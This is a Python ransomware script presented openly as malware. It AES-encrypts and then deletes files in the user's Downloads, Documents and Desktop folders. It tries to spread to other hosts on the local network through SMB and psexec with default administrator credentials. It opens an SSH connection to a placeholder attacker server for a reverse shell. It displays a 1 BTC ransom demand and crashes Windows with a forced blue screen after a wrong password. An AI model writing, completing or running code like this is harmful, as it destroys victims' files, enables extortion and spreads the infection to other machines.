import os
import shutil
import socket
import subprocess
import threading
import paramiko
import ctypes
import sys
from Crypto.Cipher import AES 
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

import subprocess
import sys
import importlib

def install_package(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def check_and_install_dependencies():
    packages = ["pycryptodome", "paramiko"]
    for package in packages:
        try:
            importlib.import_module(package)
            print(f"{package} is already installed.")
        except ImportError:
            print(f"Installing {package}...")
            install_package(package)

if __name__ == "__main__":
    check_and_install_dependencies()
    print("All dependencies installed successfully.")

# Hardcoded Encryption Key
encryption_key = b'5r$1rinepiyos0LriBrI1idubRUbef93'  # Replace with your 32-byte key

# Function to encrypt a file
def encrypt_file(file_path):
    with open(file_path, 'rb') as f:
        data = f.read()
    cipher = AES.new(encryption_key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data, AES.block_size))
    iv = cipher.iv
    with open(file_path + ".aes", 'wb') as f:
        f.write(iv + ct_bytes)
    os.remove(file_path)

# Function to traverse directories and encrypt files
def traverse_and_encrypt(path):
    for root, dirs, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            if not file.endswith(".aes") and file != os.path.basename(__file__):
                encrypt_file(file_path)

# Function to spread the ransomware to other systems on the local network
def spread():
    local_ip = socket.gethostbyname(socket.gethostname())
    for ip in range(1, 255):
        target_ip = f"{local_ip.rsplit('.', 1)[0]}.{ip}"
        try:
            socket.create_connection((target_ip, 445), timeout=1)
            subprocess.run(["psexec", f"\\\\{target_ip}", "-u", "Administrator", "-p", "password", "-c", "-f", __file__], check=True)
        except:
            pass

# Function to establish a reverse shell for remote access
def reverse_shell():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect('your_attacker_server', username='your_username', password='your_password')
    stdin, stdout, stderr = ssh.exec_command('your_reverse_shell_command')
    stdout.channel.recv_exit_status()

# Function to simulate a Blue Screen of Death (BSOD)
def bsod():
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))

# Function to lock the screen
def lock_screen():
    print("Your computer has been locked!")
    print("Your files have been encrypted. Send 1 BTC to the following address to unlock:")
    print("Zpub6xbaWBjy7Pa7abH4PD7nwXeKPEh1TgsAwp31EkafewdqgivyWU2d6rxhXmYWdTxMAMGQqGfZgsPNzKBPCvWSdMFCr1a8s9NXqqLM7Xx55QQ")
    password = input("Enter password to unlock: ")
    if password == "1060327191726278929470969404445763216037518464278308106127546517":
        print("Computer Unlocked!")
    else:
        print("Incorrect Password. Try again.")
        bsod()

# Main Function
if __name__ == "__main__":
    # Targeted folders for encryption
    folders_path = [
        os.path.join(os.path.expanduser("~"), "Downloads"),
        os.path.join(os.path.expanduser("~"), "Documents"),
        os.path.join(os.path.expanduser("~"), "Desktop")
    ]

    # Start spreading the ransomware and establishing a reverse shell in separate threads
    spread_thread = threading.Thread(target=spread)
    reverse_shell_thread = threading.Thread(target=reverse_shell)
    spread_thread.start()
    reverse_shell_thread.start()

    # Encrypt files in targeted folders
    for folder_path in folders_path:
        traverse_and_encrypt(folder_path)

    # Lock the screen
    lock_screen()
